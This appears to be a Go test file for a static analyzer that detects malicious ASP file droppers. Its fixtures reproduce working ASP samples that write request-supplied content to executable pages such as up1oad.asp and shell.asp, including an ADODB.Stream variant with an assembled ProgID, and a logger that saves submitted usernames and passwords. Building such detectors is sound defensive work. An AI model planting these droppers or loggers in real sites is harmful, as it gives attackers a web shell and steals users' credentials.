package asptaint

import "testing"

// The samples below are the SHAPES OF REAL CORPUS FILES, not invented ones. Each names the accepted
// gap item or the benign origin it was reduced from, so a later reader can go back to the sample
// rather than trusting the reduction.

func findingFor(t *testing.T, rule string, src string) *Finding {
	t.Helper()
	for _, f := range Analyze([]byte(src)) {
		if f.Rule == rule {
			g := f
			return &g
		}
	}
	return nil
}

func TestTierA_DropperToExecutableDestination(t *testing.T) {
	// Reduced from acquisition/2026-08-21-asp/staged/mal-dataset a24d35c8df105a2d (571 bytes), and
	// its byte-near twin m_ca8d0319c4518928. The destination is a FIXED literal; the content is the
	// request value. A tainted-path detector scores zero on this file.
	src := `<%
if request("txt")<>"" then
shell=request("txt")
set FileObject=Server.CreateObject("Scripting.FileSystemObject")
set TextFile=FileObject.CreateTextFile(Server.MapPath("up1oad.asp"))
TextFile.Write(shell)
response.redirect("up1oad.asp")
end if
%>`
	f := findingFor(t, "asptaint:file-drop-on-request", src)
	if f == nil {
		t.Fatalf("tier A missed the up1oad.asp dropper; got %+v", Analyze([]byte(src)))
	}
	if f.Score != score {
		t.Errorf("tier A score = %d, want %d", f.Score, score)
	}
	if f.Family != "FileDrop" {
		t.Errorf("family = %q, want FileDrop (shared with javadisk/phptaint for cross-language triage)", f.Family)
	}
}

func TestTierA_RequestDerivedDestinationCountsAsExecutable(t *testing.T) {
	// Accepted gap item 1b7451ed70e836b4. The attacker supplies BOTH halves; the page's own form
	// field is labelled "absolute path to save the file (including filename, e.g. D:\web\x.asp)".
	src := `<%
if Trim(request("systempath"))<>"" then
fdata = request("sAvedata")
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objCountFile=objFSO.CreateTextFile(request("systempath"),True)
objCountFile.Write fdata
end if
%>`
	if findingFor(t, "asptaint:file-drop-on-request", src) == nil {
		t.Fatalf("a request-chosen destination must tier as A: the extension is the attacker's to pick")
	}
}

func TestTierA_ADODBStreamBinaryDrop(t *testing.T) {
	// The generated `asp/capability/adodb-stream-write` cell. Destination arrives at SaveToFile,
	// content at Write -- two statements, and the handle carries between them.
	src := `<%
Dim st
Set st = Server.CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write Request.BinaryRead(Request.TotalBytes)
st.SaveToFile Server.MapPath("shell.asp"), 2
st.Close
%>`
	if findingFor(t, "asptaint:file-drop-on-request", src) == nil {
		t.Fatalf("ADODB.Stream drop missed; got %+v", Analyze([]byte(src)))
	}
}

func TestTierA_AssembledADODBProgIDStillBinds(t *testing.T) {
	// The receiver gate must resolve through comObjects' folding, not a file-wide literal -- the
	// same defeat this package already closes for WScript.Shell.
	src := `<%
Set st = Server.CreateObject("ADO" & "DB.Stream")
st.Open
st.Write Request.Form("d")
st.SaveToFile Server.MapPath("x.asp"), 2
%>`
	if findingFor(t, "asptaint:file-drop-on-request", src) == nil {
		t.Fatalf("an assembled ADODB.Stream ProgID must bind exactly as a literal one does")
	}
}

func TestTierB_NonExecutableDestinationScoresLower(t *testing.T) {
	// Reduced from 66a3be773fc519d4 (512 bytes): a credential logger. Real malicious, but the
	// destination is log.txt, so it is the 0.700-precision tier and must not read as proven.
	src := `<%
user=request("user")
pass=request("pass")
set fs=server.CreateObject("Scripting.FileSystemObject")
set file=fs.OpenTextFile(server.MapPath(".")&"\"&"log"&".txt",8,True)
file.writeline "user:"+user
file.writeline "pass:"+pass
file.close
%>`
	f := findingFor(t, "asptaint:request-content-file-write", src)
	if f == nil {
		t.Fatalf("tier B missed the credential logger; got %+v", Analyze([]byte(src)))
	}
	if f.Score != scoreFileWrite {
		t.Errorf("tier B score = %d, want %d", f.Score, scoreFileWrite)
	}
	if f.Score >= score {
		t.Errorf("tier B (%d) must score below tier A (%d): its measured precision is 0.700, not 1.000",
			f.Score, score)
	}
	if findingFor(t, "asptaint:file-drop-on-request", src) != nil {
		t.Errorf("a .txt destination must not reach the alert tier")
	}
}

func TestNoFinding_UntaintedContent(t *testing.T) {
	// The page writes, but nothing the caller supplied. Writing is not the signal.
	src := `<%
banner = "generated " & Now()
set fs=server.CreateObject("Scripting.FileSystemObject")
set f=fs.CreateTextFile(Server.MapPath("cache.asp"),True)
f.Write banner
f.Close
x = Request.Form("unused")
%>`
	if len(Analyze([]byte(src))) != 0 {
		t.Fatalf("untainted content must not fire: %+v", Analyze([]byte(src)))
	}
}

func TestNoFinding_ApplicationsOwnSaveToFileHelper(t *testing.T) {
	// THE MEASURED FALSE POSITIVE, and the reason SaveToFile is receiver-gated. Z-BlogASP defines
	// its own four-argument SaveToFile; 7 of the 8 benign hits for an ungated version were this
	// shape, and one was the definition itself. It is a bare function call with no ADO receiver.
	src := `<%
Public Function SaveToFile(ByVal Path, byval tOption, byval OverWrite)
End Function
s = Request.Form("content")
Call SaveToFile(BlogPath & "zb_users/theme/html5css3/source/language.asp", s, "utf-8", False)
%>`
	for _, f := range Analyze([]byte(src)) {
		if f.Family == "FileDrop" {
			t.Fatalf("an application's own SaveToFile helper is not an ADO drop: %+v", f)
		}
	}
}

func TestNoFinding_MethodFormSaveToFileOnANonADOReceiver(t *testing.T) {
	// THIS is what the receiver gate actually guards, and the Z-Blog test above does not reach it:
	// that sample calls SaveToFile as a BARE function, which `saveToFileRe` already excludes by
	// requiring a `.` receiver. An application that defines its own exporter object and calls
	// `obj.SaveToFile` method-form gets past the regex and is stopped only by `objectIs`.
	//
	// Without the gate this fires, which is the whole point of having it.
	src := `<%
Set doc = New MyExporter
doc.Write Request.Form("d")
doc.SaveToFile "report.asp"
%>`
	for _, f := range Analyze([]byte(src)) {
		if f.Family == "FileDrop" {
			t.Fatalf("a receiver that is not an ADODB.Stream must not bind a destination: %+v", f)
		}
	}
}

func TestNoFinding_WriteThroughAnUnboundHandle(t *testing.T) {
	// A handle the analysis never saw opened is not a file write. Without this the pass would fire
	// on Response.Write, which is every page in the corpus.
	src := `<%
c = Request.QueryString("c")
Response.Write c
%>`
	for _, f := range Analyze([]byte(src)) {
		if f.Family == "FileDrop" {
			t.Fatalf("Response.Write is not a file drop: %+v", f)
		}
	}
}

func TestDropperNeedsNoExecSink(t *testing.T) {
	// 46 of the 49 real ASP samples the incumbent caught and this package missed carry no exec sink
	// at all. If the pass only ran when the sink table already hit, it would close nothing.
	src := `<%
d = Request.Form("d")
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set f = fso.CreateTextFile(Server.MapPath("a.asp"), True)
f.Write d
f.Close
%>`
	found := false
	for _, f := range Analyze([]byte(src)) {
		if f.Rule == "asptaint:file-drop-on-request" {
			found = true
		}
		if f.Rule == "asptaint:sink-on-request" {
			t.Fatalf("this sample has no execution sink; sink-on-request must not fire")
		}
	}
	if !found {
		t.Fatalf("a dropper with no exec sink must still be reported")
	}
}
